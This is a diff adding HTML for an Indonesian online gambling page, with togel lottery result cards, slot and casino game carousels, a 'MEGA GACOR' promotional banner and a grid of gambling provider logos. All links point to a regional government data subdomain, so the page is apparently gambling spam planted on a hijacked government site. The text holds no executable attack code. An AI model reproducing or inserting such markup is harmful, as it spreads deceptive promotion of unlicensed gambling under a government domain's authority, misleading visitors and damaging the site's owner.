+                    <div style="font-size:0.6em; text-transform:uppercase;" class="my-1">
+                        OREGON 06                    </div>
+                    
+                    <h2 style="font-size:2.2em; line-height:110%" class="p-0 m-0 bg-white text-black">
+                        <a href="https://old.data.bengkayangkab.go.id/?m=310" target="_self" class="p-0 m-0 text-decoration-none">
+                            0246                        </a>
+                    </h2>
+                    
+                    															
+                    <div style="font-size:0.6em" class="my-1">
+                        <span 
+                            class="togel-countdown-timer" 
+                            data-time="1795555800000" 
+                            data-status="1"
+                        >
+                            HH : MM : SS
+                        </span>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        
+				
+    
+            
+        <div class="card border rounded-4 border-4 border-primary" style="width:100px; font-family: 'Saira Condensed'">
+            <div class="card-body p-0">
+                <div class="text-center text-secondary">
+                    <div style="font-size:0.6em; text-transform:uppercase;" class="my-1">
+                        OREGON 09                    </div>
+                    
+                    <h2 style="font-size:2.2em; line-height:110%" class="p-0 m-0 bg-white text-black">
+                        <a href="https://old.data.bengkayangkab.go.id/?m=311" target="_self" class="p-0 m-0 text-decoration-none">
+                            8623                        </a>
+                    </h2>
+                    
+                    															
+                    <div style="font-size:0.6em" class="my-1">
+                        <span 
+                            class="togel-countdown-timer" 
+                            data-time="1795566600000" 
+                            data-status="1"
+                        >
+                            HH : MM : SS
+                        </span>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        
+				
+    
+            
+        <div class="card border rounded-4 border-4 border-primary" style="width:100px; font-family: 'Saira Condensed'">
+            <div class="card-body p-0">
+                <div class="text-center text-secondary">
+                    <div style="font-size:0.6em; text-transform:uppercase;" class="my-1">
+                        OREGON 12                    </div>
+                    
+                    <h2 style="font-size:2.2em; line-height:110%" class="p-0 m-0 bg-white text-black">
+                        <a href="https://old.data.bengkayangkab.go.id/?m=312" target="_self" class="p-0 m-0 text-decoration-none">
+                            5056                        </a>
+                    </h2>
+                    
+                    															
+                    <div style="font-size:0.6em" class="my-1">
+                        <span 
+                            class="togel-countdown-timer" 
+                            data-time="1795577400000" 
+                            data-status="1"
+                        >
+                            HH : MM : SS
+                        </span>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        
+				
+    
+            
+        <div class="card border rounded-4 border-4 border-primary" style="width:100px; font-family: 'Saira Condensed'">
+            <div class="card-body p-0">
+                <div class="text-center text-secondary">
+                    <div style="font-size:0.6em; text-transform:uppercase;" class="my-1">
+                        FLORIDA EVENING                    </div>
+                    
+                    <h2 style="font-size:2.2em; line-height:110%" class="p-0 m-0 bg-white text-black">
+                        <a href="https://old.data.bengkayangkab.go.id/?m=313" target="_self" class="p-0 m-0 text-decoration-none">
+                            2856                        </a>
+                    </h2>
+                    
+                    															
+                    <div style="font-size:0.6em" class="my-1">
+                        <span 
+                            class="togel-countdown-timer" 
+                            data-time="1795566600000" 
+                            data-status="1"
+                        >
+                            HH : MM : SS
+                        </span>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        
+				
+    
+            
+        <div class="card border rounded-4 border-4 border-primary" style="width:100px; font-family: 'Saira Condensed'">
+            <div class="card-body p-0">
+                <div class="text-center text-secondary">
+                    <div style="font-size:0.6em; text-transform:uppercase;" class="my-1">
+                        FLORIDA MIDDAY                    </div>
+                    
+                    <h2 style="font-size:2.2em; line-height:110%" class="p-0 m-0 bg-white text-black">
+                        <a href="https://old.data.bengkayangkab.go.id/?m=314" target="_self" class="p-0 m-0 text-decoration-none">
+                            4487                        </a>
+                    </h2>
+                    
+                    															
+                    <div style="font-size:0.6em" class="my-1">
+                        <span 
+                            class="togel-countdown-timer" 
+                            data-time="1795537200000" 
+                            data-status="1"
+                        >
+                            HH : MM : SS
+                        </span>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        
+				
+    
+            
+        <div class="card border rounded-4 border-4 border-primary" style="width:100px; font-family: 'Saira Condensed'">
+            <div class="card-body p-0">
+                <div class="text-center text-secondary">
+                    <div style="font-size:0.6em; text-transform:uppercase;" class="my-1">
+                        CAROLINA MIDDAY                    </div>
+                    
+                    <h2 style="font-size:2.2em; line-height:110%" class="p-0 m-0 bg-white text-black">
+                        <a href="https://old.data.bengkayangkab.go.id/?m=315" target="_self" class="p-0 m-0 text-decoration-none">
+                            5983                        </a>
+                    </h2>
+                    
+                    															
+                    <div style="font-size:0.6em" class="my-1">
+                        <span 
+                            class="togel-countdown-timer" 
+                            data-time="1795542600000" 
+                            data-status="1"
+                        >
+                            HH : MM : SS
+                        </span>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        
+				
+    
+            
+        <div class="card border rounded-4 border-4 border-primary" style="width:100px; font-family: 'Saira Condensed'">
+            <div class="card-body p-0">
+                <div class="text-center text-secondary">
+                    <div style="font-size:0.6em; text-transform:uppercase;" class="my-1">
+                        CAROLINA EVENING                    </div>
+                    
+                    <h2 style="font-size:2.2em; line-height:110%" class="p-0 m-0 bg-white text-black">
+                        <a href="https://old.data.bengkayangkab.go.id/?m=316" target="_self" class="p-0 m-0 text-decoration-none">
+                            2196                        </a>
+                    </h2>
+                    
+                    															
+                    <div style="font-size:0.6em" class="my-1">
+                        <span 
+                            class="togel-countdown-timer" 
+                            data-time="1795571520000" 
+                            data-status="1"
+                        >
+                            HH : MM : SS
+                        </span>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        
+				
+    
+            
+        <div class="card border rounded-4 border-4 border-primary" style="width:100px; font-family: 'Saira Condensed'">
+            <div class="card-body p-0">
+                <div class="text-center text-secondary">
+                    <div style="font-size:0.6em; text-transform:uppercase;" class="my-1">
+                        NEWJERSEY EVENING                    </div>
+                    
+                    <h2 style="font-size:2.2em; line-height:110%" class="p-0 m-0 bg-white text-black">
+                        <a href="https://old.data.bengkayangkab.go.id/?m=317" target="_self" class="p-0 m-0 text-decoration-none">
+                            9736                        </a>
+                    </h2>
+                    
+                    															
+                    <div style="font-size:0.6em" class="my-1">
+                        <span 
+                            class="togel-countdown-timer" 
+                            data-time="1795570200000" 
+                            data-status="1"
+                        >
+                            HH : MM : SS
+                        </span>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        
+				
+    
+            
+        <div class="card border rounded-4 border-4 border-primary" style="width:100px; font-family: 'Saira Condensed'">
+            <div class="card-body p-0">
+                <div class="text-center text-secondary">
+                    <div style="font-size:0.6em; text-transform:uppercase;" class="my-1">
+                        NEWJERSEY MIDDAY                    </div>
+                    
+                    <h2 style="font-size:2.2em; line-height:110%" class="p-0 m-0 bg-white text-black">
+                        <a href="https://old.data.bengkayangkab.go.id/?m=318" target="_self" class="p-0 m-0 text-decoration-none">
+                            7417                        </a>
+                    </h2>
+                    
+                    															
+                    <div style="font-size:0.6em" class="my-1">
+                        <span 
+                            class="togel-countdown-timer" 
+                            data-time="1795534500000" 
+                            data-status="1"
+                        >
+                            HH : MM : SS
+                        </span>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        
+	
+
+
+
+</div>
+	</div>
+	
+	<!-- exclusive promotion -->
+	
+<div class="row my-3 g-1">
+    <div id="carousel-exlusive-promotion" class="carousel slide carousel-fade" data-bs-ride="carousel">
+        <div class="carousel-inner">					
+                            <div class="carousel-item active">
+                    <a href="https://old.data.bengkayangkab.go.id/">
+                        <img 
+                            src="https://mayanconstruction.net/image/juara288-game-mobile.png" 
+                            alt="DAILY WINS MEGA GACOR - Season 4 Level 9"
+                            fetchpriority="high"
+                            class="d-block w-100"
+                        >
+                    </a>
+                </div>
+                    </div>
+    </div>			
+</div>
+
+	<div class="my-3">
+		<form action="https://old.data.bengkayangkab.go.id/" method="get">
+			<div class="input-group rounded-5">
+				<input 
+					name="q"
+					class="form-control px-3"
+					placeholder="cari game"
+					value=""
+				>
+				<button type="submit" class="btn btn-primary"><i class="fa-solid fa-search"></i></button>
+			</div>
+		</form>
+	</div>
+
+    <div class="d-flex justify-content-between align-items-center mt-1"><h3 class="mb-0">Populer</h3><a href="https://old.data.bengkayangkab.go.id/?sort=0" class="text-decoration-none">Lihat lebih banyak <i class="fa-solid fa-angles-right"></i></a></div><div class="owl-carousel game-list-carousel"><div><a href="https://old.data.bengkayangkab.go.id/" target="_blank"><img src="https://1rm81qva4t.ovxyftbkmb.net/game_pic/square/200/vs20olympmmd.png" alt="Gates of Olympus 2500" style="width:100px;height:100px;" class="rounded"></a></div><div><a href="https://old.data.bengkayangkab.go.id/" target="_blank"><img src="https://fffiiillleee.com/open-img-pub/games/pgsoft/65.jpg" alt="Mahjong Ways" style="width:100px;height:100px;" class="rounded"></a></div><div><a href="https://old.data.bengkayangkab.go.id/" target="_blank"><img src="https://fffiiillleee.com/open-img-pub/games/pgsoft/74.jpg" alt="Mahjong Ways 2" style="width:100px;height:100px;" class="rounded"></a></div><div><a href="https://old.data.bengkayangkab.go.id/" target="_blank"><img src="https://1rm81qva4t.ovxyftbkmb.net/game_pic/square/200/vswaysmahwblck.png" alt="Mahjong Wins 3 - Black Scatter" style="width:100px;height:100px;" class="rounded"></a></div><div><a href="https://old.data.bengkayangkab.go.id/" target="_blank"><img src="https://fffiiillleee.com/open-img-pub/games/pgsoft/135.jpg" alt="Wild Bounty Showdown" style="width:100px;height:100px;" class="rounded"></a></div><div><a href="https://old.data.bengkayangkab.go.id/" target="_blank"><img src="https://1rm81qva4t.ovxyftbkmb.net/game_pic/square/200/vs20olympx.png" alt="Gates of Olympus 1000" style="width:100px;height:100px;" class="rounded"></a></div><div><a href="https://old.data.bengkayangkab.go.id/" target="_blank"><img src="https://fffiiillleee.com/open-img-pub/games/pgsoft/104.jpg" alt="Wild Bandito" style="width:100px;height:100px;" class="rounded"></a></div><div><a href="https://old.data.bengkayangkab.go.id/" target="_blank"><img src="https://1rm81qva4t.ovxyftbkmb.net/game_pic/square/200/vs20olympgold.png" alt="Gates of Olympus Super Scatter" style="width:100px;height:100px;" class="rounded"></a></div><div><a href="https://old.data.bengkayangkab.go.id/" target="_blank"><img src="https://fffiiillleee.com/open-img-pub/games/pgsoft/89.jpg" alt="Lucky Neko" style="width:100px;height:100px;" class="rounded"></a></div><div><a href="https://old.data.bengkayangkab.go.id/" target="_blank"><img src="https://1rm81qva4t.ovxyftbkmb.net/game_pic/square/200/vs20starlightx.png" alt="Starlight Princess 1000" style="width:100px;height:100px;" class="rounded"></a></div><div><a href="https://old.data.bengkayangkab.go.id/" target="_blank"><img src="https://fffiiillleee.com/open-img-pub/games/pgsoft/87.jpg" alt="Treasures of Aztec" style="width:100px;height:100px;" class="rounded"></a></div><div><a href="https://old.data.bengkayangkab.go.id/" target="_blank"><img src="https://1rm81qva4t.ovxyftbkmb.net/game_pic/square/200/vs20fruitswx.png" alt="Sweet Bonanza 1000" style="width:100px;height:100px;" class="rounded"></a></div></div><div class="d-flex justify-content-between align-items-center mt-1"><h3 class="mb-0">Terbaru</h3><a href="https://old.data.bengkayangkab.go.id/?sort=2" class="text-decoration-none">Lihat lebih banyak <i class="fa-solid fa-angles-right"></i></a></div><div class="owl-carousel game-list-carousel"><div><a href="https://old.data.bengkayangkab.go.id/" target="_blank"><img src="https://1rm81qva4t.ovxyftbkmb.net/game_pic/square/200/ar1keno.png" alt="Keno+" style="width:100px;height:100px;" class="rounded"></a></div><div><a href="https://old.data.bengkayangkab.go.id/" target="_blank"><img src="https://1rm81qva4t.ovxyftbkmb.net/game_pic/square/200/vswaysmjwld.png" alt="Double Mummy&#039;s Jewels 1000" style="width:100px;height:100px;" class="rounded"></a></div><div><a href="https://old.data.bengkayangkab.go.id/" target="_blank"><img src="https://fffiiillleee.com/open-img-pub/games/pgsoft/2188765.jpg" alt="Eureka Legends" style="width:100px;height:100px;" class="rounded"></a></div><div><a href="https://old.data.bengkayangkab.go.id/" target="_blank"><img src="https://fffiiillleee.com/open-img-pub/games/playstar/PSS-ON-00183.jpg" alt="MERRY MAHJONG" style="width:100px;height:100px;" class="rounded"></a></div><div><a href="https://old.data.bengkayangkab.go.id/" target="_blank"><img src="https://fffiiillleee.com/open-img-pub/games/nolimitcity/993.png" alt="Fire In The Hole 4" style="width:100px;height:100px;" class="rounded"></a></div><div><a href="https://old.data.bengkayangkab.go.id/" target="_blank"><img src="https://fffiiillleee.com/open-img-pub/games/redtiger/994.png" alt="Mighty Huntsman" style="width:100px;height:100px;" class="rounded"></a></div><div><a href="https://old.data.bengkayangkab.go.id/" target="_blank"><img src="https://1rm81qva4t.ovxyftbkmb.net/game_pic/square/200/vs10zsvhdspp.png" alt="Zeus vs Hades POP" style="width:100px;height:100px;" class="rounded"></a></div><div><a href="https://old.data.bengkayangkab.go.id/" target="_blank"><img src="https://1rm81qva4t.ovxyftbkmb.net/game_pic/square/200/vswaysxmasgd.png" alt="Xmas Guardians Megaways" style="width:100px;height:100px;" class="rounded"></a></div><div><a href="https://old.data.bengkayangkab.go.id/" target="_blank"><img src="https://fffiiillleee.com/open-img-pub/games/playstar/PSS-ON-00179.jpg" alt="ZOMBIE EXPRESS" style="width:100px;height:100px;" class="rounded"></a></div><div><a href="https://old.data.bengkayangkab.go.id/" target="_blank"><img src="https://1rm81qva4t.ovxyftbkmb.net/game_pic/square/200/vswaysjwofra.png" alt="Jewels of Ra" style="width:100px;height:100px;" class="rounded"></a></div><div><a href="https://old.data.bengkayangkab.go.id/" target="_blank"><img src="https://1rm81qva4t.ovxyftbkmb.net/game_pic/square/200/vs20clock.png" alt="Chronos - Sands of Eternity" style="width:100px;height:100px;" class="rounded"></a></div><div><a href="https://old.data.bengkayangkab.go.id/" target="_blank"><img src="https://fffiiillleee.com/open-img-pub/games/spadegaming/S-RM02.jpg" alt="Roma Maxways" style="width:100px;height:100px;" class="rounded"></a></div></div><div class="d-flex justify-content-between align-items-center mt-1"><h3 class="mb-0">Slot</h3><a href="https://old.data.bengkayangkab.go.id/?category=101" class="text-decoration-none">Lihat lebih banyak <i class="fa-solid fa-angles-right"></i></a></div><div class="owl-carousel game-list-carousel"><div><a href="https://old.data.bengkayangkab.go.id/" target="_blank"><img src="https://1rm81qva4t.ovxyftbkmb.net/game_pic/square/200/vs20olympmmd.png" alt="Gates of Olympus 2500" style="width:100px;height:100px;" class="rounded"></a></div><div><a href="https://old.data.bengkayangkab.go.id/" target="_blank"><img src="https://fffiiillleee.com/open-img-pub/games/pgsoft/65.jpg" alt="Mahjong Ways" style="width:100px;height:100px;" class="rounded"></a></div><div><a href="https://old.data.bengkayangkab.go.id/" target="_blank"><img src="https://fffiiillleee.com/open-img-pub/games/pgsoft/74.jpg" alt="Mahjong Ways 2" style="width:100px;height:100px;" class="rounded"></a></div><div><a href="https://old.data.bengkayangkab.go.id/" target="_blank"><img src="https://1rm81qva4t.ovxyftbkmb.net/game_pic/square/200/vswaysmahwblck.png" alt="Mahjong Wins 3 - Black Scatter" style="width:100px;height:100px;" class="rounded"></a></div><div><a href="https://old.data.bengkayangkab.go.id/" target="_blank"><img src="https://fffiiillleee.com/open-img-pub/games/pgsoft/135.jpg" alt="Wild Bounty Showdown" style="width:100px;height:100px;" class="rounded"></a></div><div><a href="https://old.data.bengkayangkab.go.id/" target="_blank"><img src="https://1rm81qva4t.ovxyftbkmb.net/game_pic/square/200/vs20olympx.png" alt="Gates of Olympus 1000" style="width:100px;height:100px;" class="rounded"></a></div><div><a href="https://old.data.bengkayangkab.go.id/" target="_blank"><img src="https://fffiiillleee.com/open-img-pub/games/pgsoft/104.jpg" alt="Wild Bandito" style="width:100px;height:100px;" class="rounded"></a></div><div><a href="https://old.data.bengkayangkab.go.id/" target="_blank"><img src="https://1rm81qva4t.ovxyftbkmb.net/game_pic/square/200/vs20olympgold.png" alt="Gates of Olympus Super Scatter" style="width:100px;height:100px;" class="rounded"></a></div><div><a href="https://old.data.bengkayangkab.go.id/" target="_blank"><img src="https://fffiiillleee.com/open-img-pub/games/pgsoft/89.jpg" alt="Lucky Neko" style="width:100px;height:100px;" class="rounded"></a></div><div><a href="https://old.data.bengkayangkab.go.id/" target="_blank"><img src="https://1rm81qva4t.ovxyftbkmb.net/game_pic/square/200/vs20starlightx.png" alt="Starlight Princess 1000" style="width:100px;height:100px;" class="rounded"></a></div><div><a href="https://old.data.bengkayangkab.go.id/" target="_blank"><img src="https://fffiiillleee.com/open-img-pub/games/pgsoft/87.jpg" alt="Treasures of Aztec" style="width:100px;height:100px;" class="rounded"></a></div><div><a href="https://old.data.bengkayangkab.go.id/" target="_blank"><img src="https://1rm81qva4t.ovxyftbkmb.net/game_pic/square/200/vs20fruitswx.png" alt="Sweet Bonanza 1000" style="width:100px;height:100px;" class="rounded"></a></div></div><div class="d-flex justify-content-between align-items-center mt-1"><h3 class="mb-0">Casino</h3><a href="https://old.data.bengkayangkab.go.id/" class="text-decoration-none">Lihat lebih banyak <i class="fa-solid fa-angles-right"></i></a></div><div class="owl-carousel game-list-carousel"><div><a href="https://old.data.bengkayangkab.go.id/" target="_blank"><img src="https://1rm81qva4t.ovxyftbkmb.net/game_pic/square/200/100010.png" alt="Kevin Hart" style="width:100px;height:100px;" class="rounded"></a></div><div><a href="https://old.data.bengkayangkab.go.id/" target="_blank"><img src="https://1rm81qva4t.ovxyftbkmb.net/game_pic/square/200/4531.png" alt="Amazing Baccarat" style="width:100px;height:100px;" class="rounded"></a></div><div><a href="https://old.data.bengkayangkab.go.id/" target="_blank"><img src="https://1rm81qva4t.ovxyftbkmb.net/game_pic/square/200/2244.png" alt="Gates of Olympus Roulette" style="width:100px;height:100px;" class="rounded"></a></div><div><a href="https://old.data.bengkayangkab.go.id/" target="_blank"><img src="https://1rm81qva4t.ovxyftbkmb.net/game_pic/square/200/4601.png" alt="Seotda Baccarat" style="width:100px;height:100px;" class="rounded"></a></div><div><a href="https://old.data.bengkayangkab.go.id/" target="_blank"><img src="https://1rm81qva4t.ovxyftbkmb.net/game_pic/square/200/8101.png" alt="Color Game Bonanza" style="width:100px;height:100px;" class="rounded"></a></div><div><a href="https://old.data.bengkayangkab.go.id/" target="_blank"><img src="https://fffiiillleee.com/open-img-pub/games/playtech/hilol.jpg" alt="Live Hi-Lo" style="width:100px;height:100px;" class="rounded"></a></div><div><a href="https://old.data.bengkayangkab.go.id/" target="_blank"><img src="https://fffiiillleee.com/open-img-pub/games/playtech/3brgl.jpg" alt="Live 3 Card Brag" style="width:100px;height:100px;" class="rounded"></a></div><div><a href="https://old.data.bengkayangkab.go.id/" target="_blank"><img src="https://fffiiillleee.com/open-img-pub/games/playtech/cspljpt.jpg" alt="Live Casino Stud Poker" style="width:100px;height:100px;" class="rounded"></a></div><div><a href="https://old.data.bengkayangkab.go.id/" target="_blank"><img src="https://fffiiillleee.com/open-img-pub/games/playtech/chel.jpg" alt="Live Casino Hold&#039;em" style="width:100px;height:100px;" class="rounded"></a></div><div><a href="https://old.data.bengkayangkab.go.id/" target="_blank"><img src="https://fffiiillleee.com/open-img-pub/games/playtech/bs_pokl.jpg" alt="Bet On Poker Live" style="width:100px;height:100px;" class="rounded"></a></div><div><a href="https://old.data.bengkayangkab.go.id/" target="_blank"><img src="https://fffiiillleee.com/open-img-pub/games/playtech/bozol.jpg" alt="Jogo Do Bozo Turbo" style="width:100px;height:100px;" class="rounded"></a></div><div><a href="https://old.data.bengkayangkab.go.id/" target="_blank"><img src="https://fffiiillleee.com/open-img-pub/games/playtech/mjpswl.jpg" alt="Fashion TV Mega Party Live" style="width:100px;height:100px;" class="rounded"></a></div></div>
+
+	<!-- game provider -->
+	<div class="my-5">
+        <h3 class="text-center">Provider Kami</h3>
+        <div class="row g-1">
+				        		        		        	<div class="col-4 col-md-3 col-lg-2 text-center">
+	        		<div class="py-3 rounded-3 glassmorphism" >
+			            <a 
+			            	href="https://old.data.bengkayangkab.go.id/" 
+			            	class="text-decoration-none"
+			            >
+			            	<img 
+			            		src="https://fffiiillleee.com/open-img-pub/providers/logo%20pragmatic.png" 
+			            		alt="logo Pragmatic" 
+			            		height="30"
+			            		style="max-width:100px;filter:drop-shadow(0px 0px 25px #fff)"
+			            	>
+			            </a>
+		        	</div>
+	        	</div>
+	        	        		        	<div class="col-4 col-md-3 col-lg-2 text-center">
+	        		<div class="py-3 rounded-3 glassmorphism" >
+			            <a 
+			            	href="https://old.data.bengkayangkab.go.id/provider=1002" 
+			            	class="text-decoration-none"
+			            >
+			            	<img 
+			            		src="https://fffiiillleee.com/open-img-pub/providers/logo%20habanero.png" 
+			            		alt="logo Habanero" 
+			            		height="30"
+			            		style="max-width:100px;filter:drop-shadow(0px 0px 25px #fff)"
+			            	>
+			            </a>
+		        	</div>
+	        	</div>
+	        	        		        	<div class="col-4 col-md-3 col-lg-2 text-center">
+	        		<div class="py-3 rounded-3 glassmorphism" >
+			            <a 
+			            	href="https://old.data.bengkayangkab.go.id/provider=1003" 
+			            	class="text-decoration-none"
+			            >
+			            	<img 
+			            		src="https://fffiiillleee.com/open-img-pub/providers/logo%20pgsoft.png" 
+			            		alt="logo PG Soft" 
+			            		height="30"
+			            		style="max-width:100px;filter:drop-shadow(0px 0px 25px #fff)"
+			            	>
+			            </a>
+		        	</div>
+	        	</div>
+	        	        		        	<div class="col-4 col-md-3 col-lg-2 text-center">
+	        		<div class="py-3 rounded-3 glassmorphism" >
+			            <a 
+			            	href="https://old.data.bengkayangkab.go.id/provider=1004" 
+			            	class="text-decoration-none"
+			            >
+			            	<img 
+			            		src="https://fffiiillleee.com/open-img-pub/providers/logo%20playstar.png" 
+			            		alt="logo Playstar" 
+			            		height="30"
+			            		style="max-width:100px;filter:drop-shadow(0px 0px 25px #fff)"
+			            	>
+			            </a>
+		        	</div>
+	        	</div>
+	        	        		        	<div class="col-4 col-md-3 col-lg-2 text-center">
+	        		<div class="py-3 rounded-3 glassmorphism" >
+			            <a 
+			            	href="https://old.data.bengkayangkab.go.id/provider=1005" 
+			            	class="text-decoration-none"
+			            >
+			            	<img 
+			            		src="https://fffiiillleee.com/open-img-pub/providers/logo%20spadegaming.png" 
+			            		alt="logo Spadegaming" 
+			            		height="30"
+			            		style="max-width:100px;filter:drop-shadow(0px 0px 25px #fff)"
+			            	>
+			            </a>
+		        	</div>
+	        	</div>
+	        	        		        	<div class="col-4 col-md-3 col-lg-2 text-center">
+	        		<div class="py-3 rounded-3 glassmorphism" >
+			            <a 
+			            	href="https://old.data.bengkayangkab.go.id/provider=1006" 
+			            	class="text-decoration-none"
+			            >
+			            	<img 
+			            		src="https://fffiiillleee.com/open-img-pub/providers/logo%20evolution.png" 
+			            		alt="logo Evolution" 
+			            		height="30"
+			            		style="max-width:100px;filter:drop-shadow(0px 0px 25px #fff)"
+			            	>
+			            </a>
+		        	</div>
+	        	</div>
+	        	        		        	<div class="col-4 col-md-3 col-lg-2 text-center">
+	        		<div class="py-3 rounded-3 glassmorphism" >
+			            <a 
+			            	href="https://old.data.bengkayangkab.go.id/provider=1007" 
+			            	class="text-decoration-none"
+			            >
+			            	<img 
+			            		src="https://fffiiillleee.com/open-img-pub/providers/logo%20redtiger.png" 
+			            		alt="logo Red Tiger" 
+			            		height="30"
+			            		style="max-width:100px;filter:drop-shadow(0px 0px 25px #fff)"
+			            	>
+			            </a>
+		        	</div>
+	        	</div>
+	        	        		        	<div class="col-4 col-md-3 col-lg-2 text-center">
+	        		<div class="py-3 rounded-3 glassmorphism" >
+			            <a 
+			            	href="https://old.data.bengkayangkab.go.id/provider=1008" 
+			            	class="text-decoration-none"
+			            >
+			            	<img 
+			            		src="https://fffiiillleee.com/open-img-pub/providers/logo%20netent.png" 
+			            		alt="logo NETENT" 
+			            		height="30"
+			            		style="max-width:100px;filter:drop-shadow(0px 0px 25px #fff)"
+			            	>
+			            </a>
+		        	</div>
+	        	</div>
+	        	        		        	<div class="col-4 col-md-3 col-lg-2 text-center">
+	        		<div class="py-3 rounded-3 glassmorphism" >
+			            <a 
+			            	href="https://old.data.bengkayangkab.go.id/provider=1009" 
+			            	class="text-decoration-none"
+			            >
+			            	<img 
+			            		src="https://fffiiillleee.com/open-img-pub/providers/logo%20bigtimegaming.png" 
+			            		alt="logo Big Time Gaming" 
+			            		height="30"
+			            		style="max-width:100px;filter:drop-shadow(0px 0px 25px #fff)"
+			            	>
+			            </a>
+		        	</div>
+	        	</div>
+	        	        		        	<div class="col-4 col-md-3 col-lg-2 text-center">
+	        		<div class="py-3 rounded-3 glassmorphism" >
+			            <a 
+			            	href="https://old.data.bengkayangkab.go.id/provider=1010" 
+			            	class="text-decoration-none"
+			            >
+			            	<img 
+			            		src="https://fffiiillleee.com/open-img-pub/providers/logo%20nolimitcity.png" 
+			            		alt="logo No Limit City" 
+			            		height="30"
+			            		style="max-width:100px;filter:drop-shadow(0px 0px 25px #fff)"
+			            	>
+			            </a>
+		        	</div>
+	        	</div>
+	        	        		        	<div class="col-4 col-md-3 col-lg-2 text-center">
+	        		<div class="py-3 rounded-3 glassmorphism" >
+			            <a 
+			            	href="https://old.data.bengkayangkab.go.id/provider=1011" 
+			            	class="text-decoration-none"
+			            >
+			            	<img 
+			            		src="https://fffiiillleee.com/open-img-pub/providers/logo%20WS168.png" 
+			            		alt="logo WS168" 
+			            		height="30"
+			            		style="max-width:100px;filter:drop-shadow(0px 0px 25px #fff)"
+			            	>
+			            </a>
+		        	</div>
+	        	</div>
+	        	        		        	<div class="col-4 col-md-3 col-lg-2 text-center">
+	        		<div class="py-3 rounded-3 glassmorphism" >
+			            <a 
+			            	href="https://old.data.bengkayangkab.go.id/provider=1012" 
+			            	class="text-decoration-none"
+			            >
+			            	<img 
+			            		src="https://file001.nxtengine.net/open-img-pub/providers/logo%20dragoonsoft.png" 
+			            		alt="logo DRAGOONSOFT" 
+			            		height="30"
+			            		style="max-width:100px;filter:drop-shadow(0px 0px 25px #fff)"
+			            	>
+			            </a>
+		        	</div>
+	        	</div>
+	        	        		        	<div class="col-4 col-md-3 col-lg-2 text-center">
+	        		<div class="py-3 rounded-3 glassmorphism" >
+			            <a 
+			            	href="https://old.data.bengkayangkab.go.id/provider=1014" 
+			            	class="text-decoration-none"
+			            >
+			            	<img 
+			            		src="https://file001.nxtengine.net/open-img-pub/providers/logo%20fachai.png" 
+			            		alt="logo FACHAI" 
+			            		height="30"
+			            		style="max-width:100px;filter:drop-shadow(0px 0px 25px #fff)"
+			            	>
+			            </a>
+		        	</div>
+	        	</div>
+	        	        		        	<div class="col-4 col-md-3 col-lg-2 text-center">
+	        		<div class="py-3 rounded-3 glassmorphism" >
+			            <a 
+			            	href="https://old.data.bengkayangkab.go.id/provider=1015" 
+			            	class="text-decoration-none"
+			            >
+			            	<img 
+			            		src="https://file001.nxtengine.net/open-img-pub/providers/logo%20fastspin.png" 
+			            		alt="logo FASTSPIN" 
+			            		height="30"
+			            		style="max-width:100px;filter:drop-shadow(0px 0px 25px #fff)"
+			            	>
+			            </a>
+		        	</div>
+	        	</div>
+	        	        		        	<div class="col-4 col-md-3 col-lg-2 text-center">
+	        		<div class="py-3 rounded-3 glassmorphism" >
+			            <a 
+			            	href="https://old.data.bengkayangkab.go.id/provider=1016" 
+			            	class="text-decoration-none"
+			            >
+			            	<img 
+			            		src="https://file001.nxtengine.net/open-img-pub/providers/logo%20jdb.png" 
+			            		alt="logo JDB" 
+			            		height="30"
+			            		style="max-width:100px;filter:drop-shadow(0px 0px 25px #fff)"
+			            	>
+			            </a>
+		        	</div>
+	        	</div>
+	        	        		        	<div class="col-4 col-md-3 col-lg-2 text-center">
+	        		<div class="py-3 rounded-3 glassmorphism" >
+			            <a 
+			            	href="https://old.data.bengkayangkab.go.id/provider=1017" 
+			            	class="text-decoration-none"
+			            >
+			            	<img 
+			            		src="https://file001.nxtengine.net/open-img-pub/providers/logo%20jili.png" 
+			            		alt="logo JILI" 
+			            		height="30"
+			            		style="max-width:100px;filter:drop-shadow(0px 0px 25px #fff)"
+			            	>
+			            </a>
+		        	</div>
+	        	</div>
+	        	        		        	<div class="col-4 col-md-3 col-lg-2 text-center">
+	        		<div class="py-3 rounded-3 glassmorphism" >
+			            <a 
+			            	href="https://old.data.bengkayangkab.go.id/provider=1018" 
+			            	class="text-decoration-none"
+			            >
+			            	<img 
+			            		src="https://file001.nxtengine.net/open-img-pub/providers/logo%20kingmaker.png" 
+			            		alt="logo KINGMAKER" 
+			            		height="30"
+			            		style="max-width:100px;filter:drop-shadow(0px 0px 25px #fff)"
+			            	>
+			            </a>
+		        	</div>
+	        	</div>
+	        	        		        	<div class="col-4 col-md-3 col-lg-2 text-center">
+	        		<div class="py-3 rounded-3 glassmorphism" >
+			            <a 
+			            	href="https://old.data.bengkayangkab.go.id/provider=1019" 
+			            	class="text-decoration-none"
+			            >
+			            	<img 
+			            		src="https://file001.nxtengine.net/open-img-pub/providers/logo%20sv388.png" 
+			            		alt="logo SV388" 
+			            		height="30"
+			            		style="max-width:100px;filter:drop-shadow(0px 0px 25px #fff)"
+			            	>
+			            </a>
+		        	</div>
+	        	</div>
+	        	        		        	<div class="col-4 col-md-3 col-lg-2 text-center">
+	        		<div class="py-3 rounded-3 glassmorphism" >
+			            <a 
+			            	href="https://old.data.bengkayangkab.go.id/provider=1021" 
+			            	class="text-decoration-none"
+			            >
+			            	<img 
+			            		src="https://file001.nxtengine.net/open-img-pub/providers/logo%20yesbingo.png" 
+			            		alt="logo YESBINGO" 
+			            		height="30"
+			            		style="max-width:100px;filter:drop-shadow(0px 0px 25px #fff)"
+			            	>
+			            </a>
+		        	</div>
+	        	</div>
+	        	        		        	<div class="col-4 col-md-3 col-lg-2 text-center">
+	        		<div class="py-3 rounded-3 glassmorphism" >
+			            <a 
+			            	href="https://old.data.bengkayangkab.go.id/provider=1040" 
+			            	class="text-decoration-none"
+			            >
+			            	<img 
+			            		src="https://file001.nxtengine.net/open-img-pub/providers/logo%20ludobet.png" 
+			            		alt="logo LUDOBET" 
+			            		height="30"
+			            		style="max-width:100px;filter:drop-shadow(0px 0px 25px #fff)"
+			            	>
+			            </a>
